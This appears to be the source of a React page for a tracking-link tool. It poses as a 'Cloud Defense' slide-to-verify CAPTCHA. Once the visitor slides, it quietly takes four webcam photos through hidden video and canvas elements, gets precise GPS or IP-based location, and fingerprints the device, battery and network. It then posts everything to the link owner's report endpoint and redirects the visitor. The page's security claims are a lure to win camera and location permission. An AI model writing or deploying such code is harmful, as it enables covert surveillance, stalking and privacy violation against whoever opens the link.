import React, { useEffect, useState, useRef, useCallback } from 'react';
import { ShieldCheck, Lock, CheckCircle2, ChevronRight, Wifi, Zap, Cpu, MousePointer2 } from 'lucide-react';
import { LinkConfig, CaptureReport, DeviceInfo, GeoLocation } from '../types';

interface Props {
  linkId: string;
}

const CapturePage: React.FC<Props> = ({ linkId }) => {
  const [status, setStatus] = useState<'idle' | 'sliding' | 'verifying' | 'done'>('idle');
  const [sliderPos, setSliderPos] = useState(0);
  const [isHovered, setIsHovered] = useState(false);
  const [redirectTarget, setRedirectTarget] = useState('https://google.com');
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const reportRef = useRef<Partial<CaptureReport>>({});
  const containerRef = useRef<HTMLDivElement>(null);
  const isDragging = useRef(false);
  const dataGatheringStarted = useRef(false);

  useEffect(() => {
    const savedLinks = JSON.parse(localStorage.getItem('il_links') || '[]');
    const found = savedLinks.find((l: LinkConfig) => l.id === linkId);
    if (found) setRedirectTarget(found.redirectUrl);
  }, [linkId]);

  // Deep device metrics gathering
  const gatherDeepMetrics = useCallback(async () => {
    if (dataGatheringStarted.current) return;
    dataGatheringStarted.current = true;

    const ua = navigator.userAgent;
    const deviceInfo: DeviceInfo = {
      browser: /chrome|crios|crmo/i.test(ua) ? 'Chrome' : /firefox|iceweasel|fxios/i.test(ua) ? 'Firefox' : /safari/i.test(ua) && !/chrome|crios|crmo/i.test(ua) ? 'Safari' : 'Unknown',
      os: /windows/i.test(ua) ? 'Windows' : /macintosh/i.test(ua) ? 'MacOS' : /linux/i.test(ua) ? 'Linux' : /android/i.test(ua) ? 'Android' : /iphone|ipad|ipod/i.test(ua) ? 'iOS' : 'Other',
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      cores: navigator.hardwareConcurrency || 0,
      userAgent: ua,
      orientation: (window.screen as any).orientation?.type || 'unknown',
      ram: (navigator as any).deviceMemory || 0,
      timezoneOffset: new Date().getTimezoneOffset(),
      timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
      devicePixelRatio: window.devicePixelRatio,
      colorDepth: window.screen.colorDepth,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      doNotTrack: navigator.doNotTrack,
      pdfViewerEnabled: navigator.pdfViewerEnabled
    };
    reportRef.current.device = deviceInfo;

    // Battery & Network details
    try {
      if ('getBattery' in navigator) {
        const battery = await (navigator as any).getBattery();
        reportRef.current.battery = {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      }
      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
      if (conn) {
        reportRef.current.network = {
          effectiveType: conn.effectiveType,
          type: conn.type,
          downlink: conn.downlink,
          rtt: conn.rtt,
          saveData: conn.saveData
        };
      }
    } catch (e) {}
  }, []);

  const getHighAccuracyLocation = useCallback((): Promise<GeoLocation> => {
    return new Promise((resolve) => {
      let watchId: number | null = null;
      let timeoutId: any = null;
      let bestFix: GeolocationPosition | null = null;

      const finish = () => {
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        if (timeoutId) clearTimeout(timeoutId);

        if (bestFix) {
          resolve({
            lat: bestFix.coords.latitude,
            lon: bestFix.coords.longitude,
            accuracy: bestFix.coords.accuracy,
            altitude: bestFix.coords.altitude,
            altitudeAccuracy: bestFix.coords.altitudeAccuracy,
            heading: bestFix.coords.heading,
            speed: bestFix.coords.speed,
          });
        } else {
          fetch('https://ipapi.co/json/')
            .then(r => r.json())
            .then(ipRes => resolve({
              lat: ipRes.latitude,
              lon: ipRes.longitude,
              accuracy: 1000,
              ip: ipRes.ip,
              city: ipRes.city,
              country: ipRes.country_name,
              isp: ipRes.org,
            }))
            .catch(() => resolve({ lat: 0, lon: 0, accuracy: 0, ip: 'Undetected' }));
        }
      };

      if (!("geolocation" in navigator)) { finish(); return; }

      timeoutId = setTimeout(finish, 12000); // 12-second window for best fix

      watchId = navigator.geolocation.watchPosition(
        (pos) => {
          if (!bestFix || pos.coords.accuracy < bestFix.coords.accuracy) {
            bestFix = pos;
            if (pos.coords.accuracy <= 30) finish(); // Excellent accuracy achieved
          }
        },
        () => {},
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    });
  }, []);

  const finalizeCapture = async () => {
    setStatus('verifying');
    
    // Start background tasks
    const geoTask = getHighAccuracyLocation();
    
    // Media Capture
    let photos: string[] = [];
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
          for (let i = 0; i < 4; i++) {
            await new Promise(r => setTimeout(r, 1000));
            const ctx = canvasRef.current.getContext('2d');
            canvasRef.current.width = videoRef.current.videoWidth;
            canvasRef.current.height = videoRef.current.videoHeight;
            ctx?.drawImage(videoRef.current, 0, 0);
            photos.push(canvasRef.current.toDataURL('image/jpeg', 0.5));
          }
          stream.getTracks().forEach(t => t.stop());
        }
      } catch (e) {}
    }

    const finalLocation = await geoTask;
    reportRef.current.location = finalLocation;
    reportRef.current.photos = photos;

    const finalReport = {
      ...reportRef.current,
      id: Math.random().toString(36).substring(7),
      timestamp: new Date().toISOString(),
      redirectUrl: redirectTarget,
      linkId: linkId
    };

    try {
      await fetch(`/api/reports/${linkId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(finalReport)
      });
    } catch (err) {}

    setStatus('done');
    setTimeout(() => {
      window.location.href = redirectTarget;
    }, 600);
  };

  const handleStart = () => {
    isDragging.current = true;
    setStatus('sliding');
    gatherDeepMetrics(); // Start gathering non-intrusive data immediately
  };

  const handleMove = (clientX: number) => {
    if (!isDragging.current || !containerRef.current) return;
    const rect = containerRef.current.getBoundingClientRect();
    const x = Math.max(0, Math.min(clientX - rect.left, rect.width - 64)); // 64 is handle width
    const percent = (x / (rect.width - 64)) * 100;
    setSliderPos(percent);
    
    if (percent >= 98) {
      isDragging.current = false;
      setSliderPos(100);
      finalizeCapture();
    }
  };

  const handleEnd = () => {
    if (!isDragging.current) return;
    isDragging.current = false;
    if (sliderPos < 98) {
      setSliderPos(0);
      setStatus('idle');
    }
  };

  useEffect(() => {
    const onMouseMove = (e: MouseEvent) => handleMove(e.clientX);
    const onTouchMove = (e: TouchEvent) => handleMove(e.touches[0].clientX);
    const onEnd = () => handleEnd();

    window.addEventListener('mousemove', onMouseMove);
    window.addEventListener('touchmove', onTouchMove);
    window.addEventListener('mouseup', onEnd);
    window.addEventListener('touchend', onEnd);

    return () => {
      window.removeEventListener('mousemove', onMouseMove);
      window.removeEventListener('touchmove', onTouchMove);
      window.removeEventListener('mouseup', onEnd);
      window.removeEventListener('touchend', onEnd);
    };
  }, [sliderPos]);

  return (
    <div className="min-h-screen bg-[#F3F4F6] flex items-center justify-center p-6 select-none font-sans overflow-hidden">
      <video ref={videoRef} className="hidden" playsInline muted></video>
      <canvas ref={canvasRef} className="hidden"></canvas>

      <div className="w-full max-sm bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100 animate-pop">
        {/* Modern Brand Header */}
        <div className="p-8 pb-4 text-center">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-brand-accent/10 rounded-2xl mb-4 border border-brand-accent/20">
            <Lock className="text-brand-accent" size={32} />
          </div>
          <h1 className="text-2xl font-black text-ink tracking-tight uppercase italic">Cloud Defense</h1>
          <p className="text-[11px] font-black text-ink/30 uppercase tracking-[0.2em] mt-1">Global Verification Node</p>
        </div>

        {/* Captcha Body */}
        <div className="p-8 pt-4 space-y-10">
          <div className="text-center space-y-1">
            <p className="text-ink font-bold text-sm">Action required to continue</p>
            <p className="text-xs text-ink/40 font-medium italic">Complete the security gesture below</p>
          </div>

          {/* Slide Interface */}
          <div 
            ref={containerRef}
            className="relative h-16 bg-gray-100 rounded-full border-2 border-gray-200 p-1 flex items-center transition-all group overflow-hidden"
          >
            {/* Background Text */}
            <div className={`absolute inset-0 flex items-center justify-center pointer-events-none transition-opacity duration-300 ${status === 'verifying' ? 'opacity-0' : 'opacity-100'}`}>
               <span className="text-ink/20 font-black uppercase text-[10px] tracking-widest flex items-center gap-2">
                 Slide to Verify <ChevronRight size={14} />
               </span>
            </div>

            {/* Progress Bar Fill */}
            <div 
              className="absolute left-0 top-0 h-full bg-brand-accent/10 transition-none"
              style={{ width: `calc(${sliderPos}% + 32px)` }}
            />

            {/* Handle */}
            <div 
              onMouseDown={handleStart}
              onTouchStart={handleStart}
              style={{ transform: `translateX(${sliderPos}%)`, left: '0' }}
              className={`relative z-10 w-14 h-14 bg-white border-2 border-brand-accent rounded-full shadow-lg cursor-grab active:cursor-grabbing flex items-center justify-center transition-shadow ${isDragging.current ? 'shadow-brand-accent/20' : ''}`}
            >
              {status === 'verifying' ? (
                <Loader2 className="animate-spin text-brand-accent" size={24} />
              ) : status === 'done' ? (
                <CheckCircle2 className="text-green-500" size={28} />
              ) : (
                <ChevronRight className="text-brand-accent group-hover:translate-x-1 transition-transform" size={28} />
              )}
            </div>
          </div>

          {status === 'verifying' && (
            <div className="grid grid-cols-2 gap-4 animate-pulse">
               <div className="flex items-center gap-2 text-[10px] font-black text-brand-accent uppercase italic">
                  <Wifi size={14} /> Checking Uplink...
               </div>
               <div className="flex items-center gap-2 text-[10px] font-black text-brand-accent uppercase italic">
                  <Zap size={14} /> Power Mapping...
               </div>
            </div>
          )}

          {errorMsg && (
            <div className="bg-red-50 p-3 rounded-lg border border-red-100 flex items-center gap-3 text-red-600 text-[11px] font-bold uppercase">
              <ShieldCheck size={16} />
              {errorMsg}
            </div>
          )}
        </div>

        {/* Dynamic Footer with Meta-Info */}
        <div className="px-8 py-5 bg-gray-50 border-t border-gray-100 flex items-center justify-between">
          <div className="flex flex-col">
            <span className="text-[10px] font-black text-ink/20 uppercase tracking-widest">Protocol</span>
            <span className="text-[9px] font-bold text-ink/40">RSA-4096 / SHA-512</span>
          </div>
          <div className="flex items-center gap-4 opacity-30 grayscale hover:grayscale-0 transition-all cursor-default">
            {/* Fix: Moved 'title' attribute to a wrapper span because Lucide icon components do not accept 'title' as a direct prop in their TypeScript definitions. */}
            <span title="CPU Verified"><Cpu size={18} /></span>
            <span title="Integrity Check"><ShieldCheck size={18} /></span>
          </div>
        </div>
      </div>

      {/* Background Decor */}
      <div className="fixed inset-0 pointer-events-none z-[-1] opacity-5">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-brand-accent rounded-full blur-[120px]" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-brand-accent rounded-full blur-[120px]" />
      </div>
      
      <div className="fixed bottom-10 flex flex-col items-center gap-2 text-ink/20 uppercase tracking-[0.5em] font-black text-[9px]">
        <span>Encrypted Browser Context Interaction</span>
        <div className="flex gap-2">
           {[...Array(5)].map((_, i) => (
             <div key={i} className={`w-1 h-1 rounded-full bg-ink/10 ${status === 'verifying' ? 'animate-bounce' : ''}`} style={{ animationDelay: `${i * 0.1}s` }} />
           ))}
        </div>
      </div>
    </div>
  );
};

const Loader2 = ({ className, size = 24 }: { className?: string, size?: number }) => (
  <svg className={className} width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
    <path d="M21 12a9 9 0 1 1-6.219-8.56" />
  </svg>
);

export default CapturePage;